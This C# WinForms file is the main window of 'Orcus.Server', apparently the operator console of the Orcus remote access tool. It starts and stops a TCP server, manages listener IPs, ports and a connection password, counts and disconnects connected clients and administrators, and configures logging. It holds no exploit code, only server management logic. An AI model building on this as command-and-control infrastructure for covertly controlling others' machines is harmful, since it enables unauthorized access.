using System;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using nUpdate.Updating;
using NLog;
using NLog.Config;
using NLog.Targets;
using NLog.Windows.Forms;
using Orcus.Server.Core;
using Orcus.Server.Core.Config;
using Orcus.Server.Forms;
using Orcus.Server.Utilities;
using Orcus.Shared.Core;

namespace Orcus.Server
{
    public partial class MainForm : Form
    {
        private readonly BindingSource _bindingSource;
        private readonly TcpServer _server;
        private MemoryTarget _memoryLogger;
        private LoggingRule _loggingRule;
        private readonly Settings _settings;
        private bool _firstHide = true;
        private bool _isClosed;

        public MainForm(TcpServer server, MemoryTarget memoryLogger, LoggingRule loggingRule, Settings settings)
        {
            InitializeComponent();
            _server = server;
            _memoryLogger = memoryLogger;
            _loggingRule = loggingRule;
            _settings = settings;
            server.AdministrationsChanged += ServerAdministrationsChanged;
            server.ClientsChanged += ServerClientsChanged;
            server.IsRunningChanged += Server_IsRunningChanged;

            _bindingSource = new BindingSource {DataSource = settings.IpAddresses};
            ListenersListBox.DataSource = _bindingSource;

            PasswordTextBox.Text = settings.Password;

            Server_IsRunningChanged(this, null);
            if (server.IsLoading)
            {
                ButtonStart.Enabled = false;
                ButtonStop.Enabled = false;
            }
        }

        public event EventHandler ShowHideMessage;

        private void SearchUpdates()
        {
            var manager = Updater.GetUpdateManager();
            var updaterUi = new UpdaterUI(manager, SynchronizationContext.Current) {UseHiddenSearch = true};
            updaterUi.ShowUserInterface();
        }

        private void Server_IsRunningChanged(object sender, EventArgs e)
        {
            if (InvokeRequired)
                BeginInvoke((MethodInvoker) RunningChanged);
            else
                RunningChanged();
        }

        private void RunningChanged()
        {
            IsRunningLabel.Text = _server.IsRunning.ToString();
            IsRunningLabel.ForeColor = _server.IsRunning ? Color.FromArgb(43, 190, 105) : Color.Black;
            if (!_server.IsRunning)
            {
                SchnorchelsLabel.Text = "0";
                AdministrationsLabel.Text = "0";
            }

            ButtonStart.Enabled = !_server.IsRunning;
            ButtonStop.Enabled = _server.IsRunning;
            ButtonDisconnectAll.Enabled = _server.IsRunning;
            ButtonDisconnectAdministrations.Enabled = _server.IsRunning;
            ButtonDisconnectSchnorchels.Enabled = _server.IsRunning;
        }

        private void ServerClientsChanged(object sender, EventArgs e)
        {
            BeginInvoke((MethodInvoker) delegate { SchnorchelsLabel.Text = _server.Clients.Count.ToString(); });
        }

        private void ServerAdministrationsChanged(object sender, EventArgs e)
        {
            BeginInvoke(
                (MethodInvoker) delegate { AdministrationsLabel.Text = _server.Administrations.Count.ToString(); });
        }

        public void PrepareShutdown()
        {
        }

        public void ShowProgressBar(string message)
        {
            if (!_isClosed)
                Invoke((MethodInvoker) delegate
                {
                    logProgressBar.Visible = true;
                    LogRichTextBox.Size = new Size(LogRichTextBox.Width, 62);

                    LogRichTextBox.AppendText(message + "\r\n");
                    LogRichTextBox.SelectionStart = LogRichTextBox.Text.Length;
                    LogRichTextBox.ScrollToCaret();
                });
        }

        public void ChangeProgress(double value)
        {
            if (!_isClosed)
                Invoke((MethodInvoker) delegate { logProgressBar.Value = (int) (value * 100); });
        }

        public void HideProgressBar()
        {
            if (!_isClosed)
                Invoke((MethodInvoker) delegate
                {
                    logProgressBar.Visible = false;
                    LogRichTextBox.Size = new Size(LogRichTextBox.Width, 75);
                });
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);
            if (!_server.IsRunning)
            {
                Application.Exit();
                return;
            }

            e.Cancel = true;
            Hide();
            if (_firstHide)
            {
                _firstHide = false;
                ShowHideMessage?.Invoke(this, EventArgs.Empty);
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            base.OnClosed(e);
            _isClosed = true;
        }

        private void ButtonStart_Click(object sender, EventArgs e)
        {
            ButtonStart.Enabled = false;
            _server.Start();
            if (_settings.UpdatePlugin != null && _settings.IsDnsUpdaterEnabled)
            {
                _settings.UpdatePlugin.ServerStarted();
                _server.DnsHostName = _settings.UpdatePlugin.Host;
            }
        }

        private void ButtonStop_Click(object sender, EventArgs e)
        {
            ButtonStop.Enabled = false;
            _server.Stop();
            _settings.UpdatePlugin?.Stop();
        }

        private void ButtonDisconnectAll_Click(object sender, EventArgs e)
        {
            foreach (var client in _server.Clients.ToList())
                try
                {
                    client.Value.Dispose();
                }
                catch (Exception)
                {
                    // ignored
                }

            foreach (var administration in _server.Administrations.ToList())
                try
                {
                    administration.Value.Dispose();
                }
                catch (Exception)
                {
                    // ignored
                }

            MessageBox.Show("Everything was successfully disconnected", "Success", MessageBoxButtons.OK,
                MessageBoxIcon.Information);
        }

        private void ButtonDisconnectSchnorchels_Click(object sender, EventArgs e)
        {
            foreach (var client in _server.Clients.ToList())
                try
                {
                    client.Value.Dispose();
                }
                catch (Exception)
                {
                    // ignored
                }


            MessageBox.Show("All clients were successfully disconnected", "Success", MessageBoxButtons.OK,
                MessageBoxIcon.Information);
        }

        private void ButtonDisconnectAdministrations_Click(object sender, EventArgs e)
        {
            foreach (var administration in _server.Administrations.ToList())
                try
                {
                    administration.Value.Dispose();
                }
                catch (Exception)
                {
                    // ignored
                }


            MessageBox.Show("All administrations were successfully disconnected", "Success", MessageBoxButtons.OK,
                MessageBoxIcon.Information);
        }

        private void ChangePasswordButton_Click(object sender, EventArgs e)
        {
            _settings.Password = PasswordTextBox.Text;
            _server.Password = PasswordTextBox.Text;
            MessageBox.Show("Successfully changed password");
        }

        private void AddListenerButton_Click(object sender, EventArgs e)
        {
            var window = new CreateNewListenerForm();
            if (window.ShowDialog(this) == DialogResult.OK)
            {
                var ipAddressInfo = new IpAddressInfo {Ip = window.IpAddress, Port = window.Port};
                _settings.IpAddresses.Add(ipAddressInfo);
                _settings.Save();
                _bindingSource.ResetBindings(false);
                _server.AddListener(ipAddressInfo);
            }
        }

        private void RemoveListenerButton_Click(object sender, EventArgs e)
        {
            if (ListenersListBox.SelectedIndex == -1)
                return;

            if (_settings.IpAddresses.Count == 1)
            {
                MessageBox.Show("You can't remove the last listener. Please create a new one and delete it then",
                    "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var ipAddressInfo = (IpAddressInfo) ListenersListBox.SelectedItem;
            _settings.IpAddresses.Remove(ipAddressInfo);
            _settings.Save();
            _server.RemoveListener(ipAddressInfo);
            _bindingSource.ResetBindings(false);
        }

        private void ListenersListBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            RemoveListenerButton.Enabled = ListenersListBox.SelectedIndex > -1;
        }

        private void ShowPasswordCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            PasswordTextBox.UseSystemPasswordChar = !ShowPasswordCheckBox.Checked;
        }

        private void SettingsButton_Click(object sender, EventArgs e)
        {
            new SettingsWindow(_settings, _server).ShowDialog(this);
        }

        protected override void OnShown(EventArgs e)
        {
            SearchUpdates();
            if (_memoryLogger.Logs.Count > 0)
                LogRichTextBox.Text =
                    _memoryLogger.Logs.Aggregate(new StringBuilder(), (x, y) => x.AppendLine(y)).ToString();

            LogManager.Configuration.LoggingRules.Remove(_loggingRule);
            _memoryLogger.Dispose();

            _memoryLogger = null;
            _loggingRule = null;

            var target = new RichTextBoxTarget
            {
                Layout = Program.LogLayout,
                ControlName = "LogRichTextBox",
                FormName = Name,
                AutoScroll = true,
                CreatedForm = false,
                Name = "textBox"
            };

            target.RowColoringRules.Add(new RichTextBoxRowColoringRule("level == LogLevel.Debug", "Gray", "White"));
            target.RowColoringRules.Add(new RichTextBoxRowColoringRule("level == LogLevel.Info", "Black", "White"));
            target.RowColoringRules.Add(new RichTextBoxRowColoringRule("level == LogLevel.Warn", "DarkRed", "White"));
            target.RowColoringRules.Add(new RichTextBoxRowColoringRule("level == LogLevel.Error", "White", "DarkRed",
                FontStyle.Bold));
            target.RowColoringRules.Add(new RichTextBoxRowColoringRule("level == LogLevel.Fatal", "Yellow", "DarkRed",
                FontStyle.Bold));

            SimpleConfigurator.ConfigureForTargetLogging(target, Program.MinLogLevel);
        }
    }
}